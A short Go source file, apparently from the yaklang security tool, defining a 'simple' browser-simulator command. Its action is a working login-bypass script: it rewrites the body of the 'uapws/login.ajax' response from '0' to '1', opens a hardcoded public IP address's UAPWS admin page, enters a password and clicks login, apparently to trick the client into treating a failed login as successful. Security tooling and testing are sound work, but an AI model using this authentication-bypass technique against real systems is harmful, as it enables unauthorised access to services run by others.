package sub

import (
	"github.com/urfave/cli"
	"yaklang/common/simulator/simple"
	"time"
)

var Simple = cli.Command{
	Name:   "simple",
	Usage:  "simple browser simulator action",
	Before: nil,
	After:  nil,

	OnUsageError: nil,
	Subcommands:  nil,

	Action: func(c *cli.Context) error {
		replaceStr := []string{"0", "1"}
		replaceModify := simple.WithResponseModification("uapws/login.ajax", simple.BodyReplaceTarget, replaceStr)
		browser := simple.CreateHeadlessBrowser(simple.WithHeadless(false), replaceModify)
		page := browser.Navigate("http://121.5.162.122:8099/uapws/")
		page.Input("#password", "123321")
		page.Click("#dijit_form_Button_0_label")
		time.Sleep(2 * time.Second)
		return nil
	},
}
